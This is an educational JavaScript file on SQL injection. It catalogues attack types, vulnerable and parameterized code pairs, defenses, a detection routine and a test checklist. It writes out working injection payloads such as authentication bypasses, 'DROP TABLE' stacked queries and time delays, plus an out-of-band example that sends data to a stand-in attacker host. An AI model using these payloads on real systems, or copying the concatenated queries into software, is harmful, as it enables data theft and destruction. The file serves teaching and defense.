/**
 * SQL Injection - Database Security Vulnerability
 *
 * SQL injection (SQLi) is a type of cyber attack that targets SQL-based
 * databases. Attackers manipulate the database by inserting malicious SQL
 * commands through input fields. This can bypass authentication, retrieve
 * sensitive information, modify data, or take control of the server.
 *
 * Key Concepts:
 * - Input validation and sanitization
 * - Parameterized queries
 * - Principle of least privilege
 * - Defense in depth
 */

/**
 * SQLInjectionType represents different SQL injection techniques.
 */
class SQLInjectionType {
    static types = {
        inBand: {
            name: 'In-Band SQL Injection',
            description: 'Attacker uses same channel to launch and gather results',
            subtypes: {
                errorBased: {
                    name: 'Error-Based',
                    description: 'Uses database error messages to reveal information',
                    example: "' AND 1=CONVERT(int, @@version)--"
                },
                unionBased: {
                    name: 'UNION-Based',
                    description: 'Uses UNION operator to combine results',
                    example: "' UNION SELECT username, password FROM users--"
                }
            }
        },
        blind: {
            name: 'Blind SQL Injection',
            description: 'No visible feedback, inferred through behavior',
            subtypes: {
                booleanBased: {
                    name: 'Boolean-Based',
                    description: 'Infers data from true/false responses',
                    example: "' AND 1=1--  vs  ' AND 1=2--"
                },
                timeBased: {
                    name: 'Time-Based',
                    description: 'Infers data from response delay',
                    example: "'; WAITFOR DELAY '0:0:5'--"
                }
            }
        },
        outOfBand: {
            name: 'Out-of-Band SQL Injection',
            description: 'Uses different channel for results (DNS, HTTP)',
            example: "'; EXEC master..xp_dirtree '//attacker.com/data'--",
            requirements: 'Database server can make external connections'
        }
    };

    /**
     * Gets type by name
     * @param {string} name - Type name
     * @returns {Object} Type details
     */
    static getType(name) {
        return this.types[name];
    }

    /**
     * Gets all types
     * @returns {Array} All types
     */
    static getAllTypes() {
        return Object.entries(this.types).map(([key, value]) => ({
            id: key,
            ...value
        }));
    }
}

/**
 * VulnerableCodeExample shows vulnerable patterns (for education).
 */
class VulnerableCodeExample {
    static examples = {
        stringConcatenation: {
            name: 'String Concatenation',
            description: 'Directly concatenating user input into SQL',
            vulnerable: "SELECT * FROM users WHERE username = '" + "userInput" + "'",
            attack: "' OR '1'='1",
            result: "SELECT * FROM users WHERE username = '' OR '1'='1'",
            risk: 'Returns all users, bypasses authentication'
        },
        dynamicQuery: {
            name: 'Dynamic Query Building',
            description: 'Building queries dynamically with user input',
            vulnerable: "query = 'SELECT * FROM products WHERE category = ' + category",
            attack: "electronics'; DROP TABLE products;--",
            result: "SELECT * FROM products WHERE category = 'electronics'; DROP TABLE products;--",
            risk: 'Executes arbitrary SQL, can destroy data'
        },
        orderByClause: {
            name: 'Dynamic ORDER BY',
            description: 'User-controlled sorting field',
            vulnerable: "query = 'SELECT * FROM items ORDER BY ' + sortField",
            attack: "(SELECT password FROM users WHERE username='admin')",
            risk: 'Can extract data through sorting behavior'
        }
    };

    /**
     * Gets example by name
     * @param {string} name - Example name
     * @returns {Object} Example
     */
    static getExample(name) {
        return this.examples[name];
    }

    /**
     * Gets all examples
     * @returns {Array} All examples
     */
    static getAllExamples() {
        return Object.entries(this.examples).map(([key, value]) => ({
            id: key,
            ...value
        }));
    }
}

/**
 * SQLInjectionDefense provides defense strategies.
 */
class SQLInjectionDefense {
    /**
     * Gets primary defenses
     * @returns {Array} Defenses
     */
    static getPrimaryDefenses() {
        return [
            {
                defense: 'Parameterized Queries (Prepared Statements)',
                description: 'Separate SQL code from data',
                effectiveness: 'Very High',
                example: {
                    language: 'JavaScript',
                    code: "db.query('SELECT * FROM users WHERE id = ?', [userId])"
                }
            },
            {
                defense: 'Stored Procedures',
                description: 'Use parameterized stored procedures',
                effectiveness: 'High',
                caveat: 'Must still use parameters, not concatenation in procedure'
            },
            {
                defense: 'Input Validation',
                description: 'Whitelist validation of user input',
                effectiveness: 'Medium',
                example: 'Validate that ID is numeric, email matches pattern'
            },
            {
                defense: 'Escaping User Input',
                description: 'Escape special characters',
                effectiveness: 'Medium',
                caveat: 'Not as reliable as parameterization, use as last resort'
            }
        ];
    }

    /**
     * Gets additional defenses
     * @returns {Array} Additional defenses
     */
    static getAdditionalDefenses() {
        return [
            {
                defense: 'Least Privilege',
                description: 'Database user should have minimal permissions',
                implementation: 'App user cannot DROP, DELETE, or modify schema'
            },
            {
                defense: 'Web Application Firewall',
                description: 'Filter known SQL injection patterns',
                caveat: 'Should not be sole defense, can be bypassed'
            },
            {
                defense: 'Error Handling',
                description: 'Dont expose database errors to users',
                implementation: 'Log errors internally, show generic message'
            },
            {
                defense: 'Allowlisting',
                description: 'Only allow expected values for dynamic parts',
                example: 'Column names from predefined list'
            }
        ];
    }

    /**
     * Gets secure code examples
     * @returns {Object} Secure code examples
     */
    static getSecureCodeExamples() {
        return {
            javascript: {
                vulnerable: "db.query(`SELECT * FROM users WHERE id = ${userId}`)",
                secure: "db.query('SELECT * FROM users WHERE id = ?', [userId])"
            },
            python: {
                vulnerable: "cursor.execute(f\"SELECT * FROM users WHERE id = {user_id}\")",
                secure: "cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))"
            },
            java: {
                vulnerable: "stmt.executeQuery(\"SELECT * FROM users WHERE id = \" + userId)",
                secure: "PreparedStatement ps = conn.prepareStatement(\"SELECT * FROM users WHERE id = ?\"); ps.setInt(1, userId);"
            }
        };
    }
}

/**
 * SQLInjectionTester provides testing utilities.
 */
class SQLInjectionTester {
    static testPayloads = [
        { payload: "'", purpose: 'Basic quote test', detectsVia: 'Error message' },
        { payload: "' OR '1'='1", purpose: 'Boolean bypass', detectsVia: 'Different response' },
        { payload: "' OR '1'='1'--", purpose: 'Comment bypass', detectsVia: 'Different response' },
        { payload: "1; SELECT * FROM users", purpose: 'Stacked query', detectsVia: 'Multiple results' },
        { payload: "' UNION SELECT NULL--", purpose: 'UNION test', detectsVia: 'Column count error' },
        { payload: "' AND SLEEP(5)--", purpose: 'Time-based blind', detectsVia: 'Response delay' }
    ];

    /**
     * Analyzes input for SQL injection patterns
     * @param {string} input - User input to analyze
     * @returns {Object} Analysis result
     */
    static analyzeInput(input) {
        const suspiciousPatterns = [
            { pattern: /['"](\s*OR\s*['"]?\d+['"]?\s*=\s*['"]?\d+)/i, name: 'Boolean bypass' },
            { pattern: /UNION\s+SELECT/i, name: 'UNION injection' },
            { pattern: /;\s*(SELECT|INSERT|UPDATE|DELETE|DROP)/i, name: 'Stacked query' },
            { pattern: /(WAITFOR\s+DELAY|SLEEP\s*\()/i, name: 'Time-based' },
            { pattern: /(--)|(\/\*)|(#\s*$)/m, name: 'Comment injection' },
            { pattern: /xp_cmdshell|EXEC\s+master/i, name: 'Command execution' }
        ];

        const findings = [];
        for (const { pattern, name } of suspiciousPatterns) {
            if (pattern.test(input)) {
                findings.push({ pattern: name, detected: true });
            }
        }

        return {
            input: input.substring(0, 50) + (input.length > 50 ? '...' : ''),
            suspicious: findings.length > 0,
            findings,
            recommendation: findings.length > 0
                ? 'Block request and log for investigation'
                : 'Input appears safe (still use parameterized queries)'
        };
    }

    /**
     * Gets testing checklist
     * @returns {Array} Checklist items
     */
    static getTestingChecklist() {
        return [
            'Test all input fields (forms, URLs, headers, cookies)',
            'Test numeric, string, and date parameters',
            'Test with single quotes and double quotes',
            'Test UNION-based injection',
            'Test time-based blind injection',
            'Test error-based injection',
            'Test with encoded payloads (URL, Unicode)',
            'Test stored procedures and dynamic queries',
            'Test all database interactions',
            'Verify parameterized queries are used throughout'
        ];
    }
}

/**
 * SQLInjectionImpact describes potential impacts.
 */
class SQLInjectionImpact {
    static impacts = {
        dataTheft: {
            name: 'Data Theft',
            description: 'Unauthorized access to sensitive data',
            examples: ['Customer records', 'Financial data', 'Credentials'],
            severity: 'Critical'
        },
        dataManipulation: {
            name: 'Data Manipulation',
            description: 'Unauthorized modification of data',
            examples: ['Price manipulation', 'Account balances', 'Permissions'],
            severity: 'Critical'
        },
        dataDestruction: {
            name: 'Data Destruction',
            description: 'Deletion of database tables or records',
            examples: ['DROP TABLE', 'DELETE FROM', 'TRUNCATE'],
            severity: 'Critical'
        },
        authenticationBypass: {
            name: 'Authentication Bypass',
            description: 'Login without valid credentials',
            examples: ['Admin access', 'User impersonation'],
            severity: 'Critical'
        },
        serverCompromise: {
            name: 'Server Compromise',
            description: 'Gaining control of database server',
            examples: ['Command execution', 'File access', 'Lateral movement'],
            severity: 'Critical'
        }
    };

    /**
     * Gets impact by name
     * @param {string} name - Impact name
     * @returns {Object} Impact details
     */
    static getImpact(name) {
        return this.impacts[name];
    }

    /**
     * Gets all impacts
     * @returns {Array} All impacts
     */
    static getAllImpacts() {
        return Object.entries(this.impacts).map(([key, value]) => ({
            id: key,
            ...value
        }));
    }
}

// Demonstration
console.log('=== SQL Injection Demo ===\n');

// Injection types
console.log('--- SQL Injection Types ---');
SQLInjectionType.getAllTypes().forEach(type => {
    console.log(`\n${type.name}: ${type.description}`);
});

// Vulnerable patterns
console.log('\n--- Vulnerable Code Patterns ---');
VulnerableCodeExample.getAllExamples().slice(0, 2).forEach(example => {
    console.log(`\n${example.name}:`);
    console.log(`  Risk: ${example.risk}`);
});

// Defense strategies
console.log('\n--- Defense Strategies ---');
console.log('Primary defenses:');
SQLInjectionDefense.getPrimaryDefenses().forEach(defense => {
    console.log(`  - ${defense.defense} (${defense.effectiveness})`);
});

// Secure code examples
console.log('\n--- Secure Code Examples ---');
const examples = SQLInjectionDefense.getSecureCodeExamples();
console.log('JavaScript:');
console.log('  Vulnerable:', examples.javascript.vulnerable);
console.log('  Secure:', examples.javascript.secure);

// Input analysis
console.log('\n--- Input Analysis ---');
console.log('Safe input:', SQLInjectionTester.analyzeInput('john.doe@email.com'));
console.log('Suspicious input:', SQLInjectionTester.analyzeInput("' OR '1'='1"));
console.log('Attack attempt:', SQLInjectionTester.analyzeInput("'; DROP TABLE users;--"));

// Test payloads
console.log('\n--- Testing Payloads ---');
SQLInjectionTester.testPayloads.slice(0, 4).forEach(payload => {
    console.log(`"${payload.payload}" - ${payload.purpose}`);
});

// Impact
console.log('\n--- Potential Impacts ---');
SQLInjectionImpact.getAllImpacts().slice(0, 3).forEach(impact => {
    console.log(`${impact.name} (${impact.severity}): ${impact.description}`);
});

// Testing checklist
console.log('\n--- Testing Checklist ---');
SQLInjectionTester.getTestingChecklist().slice(0, 5).forEach((item, i) => {
    console.log(`${i + 1}. ${item}`);
});

/**
 * Best Practices for SQL Injection Prevention:
 *
 * 1. Always use parameterized queries (prepared statements)
 * 2. Validate and sanitize all user input
 * 3. Use stored procedures with parameters
 * 4. Apply principle of least privilege to database accounts
 * 5. Escape special characters when parameterization not possible
 * 6. Use allowlists for dynamic query parts
 * 7. Implement proper error handling
 * 8. Deploy web application firewall
 * 9. Regularly test for SQL injection vulnerabilities
 * 10. Keep database software updated with security patches
 */
